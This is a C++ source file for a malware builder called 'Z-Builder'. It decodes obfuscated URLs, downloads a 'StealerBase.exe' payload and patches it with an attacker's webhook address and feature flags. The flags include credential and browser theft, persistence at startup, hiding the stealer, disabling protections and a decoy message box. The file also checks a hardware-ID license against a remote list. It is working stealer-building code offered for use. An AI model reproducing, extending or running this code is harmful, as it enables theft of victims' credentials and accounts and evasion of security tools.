#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <string>
#include <iostream>
#include <Wininet.h>
#include <iterator>
#include <string>
#include <algorithm>
#include <vector>
#include <fstream>
#include <sstream>
#include "XorString.h"
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "urlmon.lib")
#define XorString( String ) ( CXorString<ConstructIndexList<sizeof( String ) - 1>::Result>( String ).decrypt() )

using namespace std;

string GetHWID();
string DownloadString(string URL);
string decrypt(string str);
bool VerifyLicense(string License);
int DownloadFile(string url, string path);
string decrypt2(string toEncrypt);

// command syntax: [ID]==[WebHook_URL]==[Path]==[AAP-Data]==[Tracer:(Y/N)]--[Recover:(Y/N)]--[GetAllAccs:(Y/N)]--[DeleteGT:(Y/N)]--[StartUp:(Y/N)]--[HideStealer:(Y/N)]==[Title]==[Message]==
// ID has to be 8 chars
// ID has to be combined with HWID. Example: [ID{HWID}]

std::string ReplaceAll(std::string str, const std::string& from, const std::string& to) {
	size_t start_pos = 0;
	while ((start_pos = str.find(from, start_pos)) != std::string::npos) {
		str.replace(start_pos, from.length(), to);
		start_pos += to.length(); // Handles case where 'to' is a substring of 'from'
	}
	return str;
}

int main(int argc, char* argv[])
{
	std::vector<string> CMDParts;
	string command;
	if (argc >= 2)
	{
		command = argv[argc - 1];
	}
	else
	{
		cout << "Command line interface for Z-Builder\n=============================================\n(Do not use if you have no idea what this is)\n\n";
		cout << "Command: ";
		cin >> command;
	}
	command = ReplaceAll(command, "[SPACE]", " ");
	string HWID = GetHWID();
	string cmdSplitter = "==";
	if (command.find(cmdSplitter) != string::npos)
	{
		try
		{
			while (command.find(cmdSplitter) != string::npos)
			{
				size_t cmdSplitterLocation = command.find(cmdSplitter);
				string aCommand = command.substr(0, cmdSplitterLocation);
				CMDParts.push_back(aCommand);
				command.erase(0, cmdSplitterLocation + 2);
			}
		}
		catch (...)
		{
			cout << "Invalid syntax!";
			return 0;
		}
	}
	if (CMDParts.size() == 7)
	{
		string RawID = CMDParts[0];
		size_t EndID = RawID.find("]");
		string IDPart = RawID.substr(0, EndID);
		string License = IDPart + "{" + GetHWID() + "}]";
		if (VerifyLicense(License))
		{
			string UnencryptedWebHook = CMDParts[1];
			string RemovedBracketsWB = UnencryptedWebHook.substr(1, UnencryptedWebHook.size() - 2);
			string WebHook = decrypt(RemovedBracketsWB);
			string tempPath = getenv("TEMP");
			string StealerBase = tempPath + "\\StealerBase.exe";
			DownloadFile(DownloadString(decrypt2("21$8*h//*$#<<0int&?%v awu&ey*99Q2")), StealerBase);
			ifstream MyFile(StealerBase, std::ios::binary);
			string AllBytes = string((istreambuf_iterator<char>(MyFile)),
				(istreambuf_iterator<char>()));
			string DummyLicense = XorStr("[zbuilder{zbuilder}]");
			size_t DummyLicenseLocation = AllBytes.find(DummyLicense);
			AllBytes.replace(DummyLicenseLocation, DummyLicense.length(), decrypt(License));
			string DummyText = XorStr("[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]");
			string DummyText2 = XorStr("<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>");
			size_t DummyTextLocation = AllBytes.find(DummyText);
			size_t DummyText2Location = AllBytes.find(DummyText2);
			AllBytes.replace(DummyTextLocation, WebHook.length(), WebHook);
			AllBytes.replace(DummyText2Location, WebHook.length(), WebHook);
			string RawLocation = CMDParts[2];
			string AAPData = CMDParts[3];
			string DummyAAP = XorStr("{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}");
			size_t DummyAAPLocation = AllBytes.find(DummyAAP);
			AllBytes.replace(DummyAAPLocation, AAPData.length(), AAPData);
			string Features = CMDParts[4];
			string DummyFeatures = XorStr("[DisableProt:(N)]--[Tracer:(N)]--[Recover:(N)]--[GetAllAccs:(N)]--[DeleteGT:(N)]--[StartUp:(N)]--[HideStealer:(N)]--[BrowserCreds:(N)]");
			size_t DummyFeaturesLocation = AllBytes.find(DummyFeatures);
			AllBytes.replace(DummyFeaturesLocation, DummyFeatures.length(), Features);
			string Location = RawLocation.substr(1, RawLocation.size() - 2);

			//Message Box
			string MessageTitle = CMDParts[5];
			MessageTitle = MessageTitle.substr(1, MessageTitle.size() - 2);
			string DummyTitle = "+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-";
			size_t DummyTitleLocation = AllBytes.find(DummyTitle);
			AllBytes.replace(DummyTitleLocation, MessageTitle.length(), MessageTitle);
			string Message = CMDParts[6];
			Message = Message.substr(1, Message.size() - 2);
			string DummyMessage = "=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-";
			size_t DummyMessageLocation = AllBytes.find(DummyMessage);
			AllBytes.replace(DummyMessageLocation, Message.length(), Message);
			// Message Box - End

			ofstream WriteFile(Location, std::ofstream::trunc | std::ios::binary);
			WriteFile << AllBytes;
			remove(StealerBase.c_str());
		}
		else 
		{
			cout << "Invalid license";
		}
		return 0;
	}
	else
	{
		cout << "Invalid syntax!";
	}
}


// Check license
bool VerifyLicense(string License)
{
	std::vector<string> allLicenses;
	string rawLicenseData = DownloadString(decrypt2("21$8*h//*$#<<0int&?%v awu}ax+uU"));
	rawLicenseData.erase(remove(rawLicenseData.begin(), rawLicenseData.end(), '\r'), rawLicenseData.end());
	rawLicenseData.erase(remove(rawLicenseData.begin(), rawLicenseData.end(), '\n'), rawLicenseData.end());
	while (rawLicenseData.find("]") != string::npos)
	{
		size_t Splitter = rawLicenseData.find("]");
		string aLicense = rawLicenseData.substr(0, Splitter + 1);
		allLicenses.push_back(aLicense);
		rawLicenseData.erase(0, Splitter + 1);
	}
	if (std::find(allLicenses.begin(), allLicenses.end(), License) != allLicenses.end())
	{
		return true;
	}
	else
	{
		return false;
	}
}

// Check license - End

// Download File
size_t write_data(void* ptr, size_t size, size_t nmemb, FILE* stream)
{
	size_t written;
	written = fwrite(ptr, size, nmemb, stream);
	return written;
}

int DownloadFile(string url, string path)
{
	HRESULT hr;
	wstring Wurl;
	Wurl.assign(url.begin(), url.end());
	wstring Wpath;
	Wpath.assign(path.begin(), path.end());
	LPCTSTR Url = Wurl.c_str(), File = Wpath.c_str();
	hr = URLDownloadToFile(0, Url, File, 0, 0);
	return 0;
}
// Download File - End

// Get HWID
string GetHWID()
{
	std::string m_sResult;
	HANDLE m_hFile = CreateFileW(L"\\\\.\\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	if (m_hFile == INVALID_HANDLE_VALUE)
		return { };

	std::unique_ptr< std::remove_pointer <HANDLE >::type, void(*)(HANDLE) > m_hDevice
	{
		m_hFile, [](HANDLE handle)
		{
			CloseHandle(handle);
		}
	};

	STORAGE_PROPERTY_QUERY m_PropertyQuery;
	m_PropertyQuery.PropertyId = StorageDeviceProperty;
	m_PropertyQuery.QueryType = PropertyStandardQuery;

	STORAGE_DESCRIPTOR_HEADER m_DescHeader;
	DWORD m_dwBytesReturned = 0;
	if (!DeviceIoControl(m_hDevice.get(), IOCTL_STORAGE_QUERY_PROPERTY, &m_PropertyQuery, sizeof(STORAGE_PROPERTY_QUERY),
		&m_DescHeader, sizeof(STORAGE_DESCRIPTOR_HEADER), &m_dwBytesReturned, NULL))
		return { };

	const DWORD m_dwOutBufferSize = m_DescHeader.Size;
	std::unique_ptr< BYTE[] > m_pOutBuffer{ new BYTE[m_dwOutBufferSize] { } };

	if (!DeviceIoControl(m_hDevice.get(), IOCTL_STORAGE_QUERY_PROPERTY, &m_PropertyQuery, sizeof(STORAGE_PROPERTY_QUERY),
		m_pOutBuffer.get(), m_dwOutBufferSize, &m_dwBytesReturned, NULL))
		return { };

	STORAGE_DEVICE_DESCRIPTOR* m_pDeviceDescriptor = reinterpret_cast<STORAGE_DEVICE_DESCRIPTOR*>(m_pOutBuffer.get());
	const DWORD m_dwSerialNumberOffset = m_pDeviceDescriptor->SerialNumberOffset;
	if (m_dwSerialNumberOffset == 0)
		return { };

	m_sResult = reinterpret_cast<const char*>(m_pOutBuffer.get() + m_dwSerialNumberOffset);
	m_sResult.erase(std::remove_if(m_sResult.begin(), m_sResult.end(), std::isspace), m_sResult.end());

	if (m_sResult.size() != 8)
	{
		if (m_sResult.size() > 8)
		{
			m_sResult = m_sResult.substr(m_sResult.size() - 8);
		}
		if (m_sResult.size() < 8)
		{
			while (m_sResult.size() != 8)
			{
				m_sResult = m_sResult + "0";
			}
		}
	}
	return m_sResult;
}
// Get HWID - End

// Download string
string replaceAll(string subject, const string& search,
	const string& replace) {
	size_t pos = 0;
	while ((pos = subject.find(search, pos)) != string::npos) {
		subject.replace(pos, search.length(), replace);
		pos += replace.length();
	}
	return subject;
}

string DownloadString(string URL) {
	HINTERNET interwebs = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);
	HINTERNET urlFile;
	string rtn;
	if (interwebs) {
		urlFile = InternetOpenUrlA(interwebs, URL.c_str(), NULL, NULL, NULL, NULL);
		if (urlFile) {
			char buffer[2000];
			DWORD bytesRead;
			do {
				InternetReadFile(urlFile, buffer, 2000, &bytesRead);
				rtn.append(buffer, bytesRead);
				memset(buffer, 0, 2000);
			} while (bytesRead);
			InternetCloseHandle(interwebs);
			InternetCloseHandle(urlFile);
			string p = replaceAll(rtn, "|n", "\r\n");
			return p;
		}
	}
	InternetCloseHandle(interwebs);
	string p = replaceAll(rtn, "|n", "\r\n");
	return p;
}
// Download string end

// Decrypt strings
string decrypt(string str)
{
	string temp = str;
	int length;

	length = (int)temp.length();

	for (int i = 0; i < length; i++)
	{
		if (isalpha(temp[i]))
		{
			for (int j = 0; j < 13; j++)
			{
				if (temp[i] == 'z')
				{
					temp[i] = 'a';
				}
				else if (temp[i] == 'Z')
				{
					temp[i] = 'A';
				}
				else
				{
					temp[i]++;
				}
			}
		}
	}

	return temp;
}

string decrypt2(string toEncrypt) {
	char key[8] = { 'Z', 'E', 'P', 'H', 'Y', 'R' }; //Any chars will work
	string output = toEncrypt;

	for (int i = 0; i < toEncrypt.size(); i++)
		output[i] = toEncrypt[i] ^ key[i % (sizeof(key) / sizeof(char))];

	return output;
}
// Decrypt strings - End
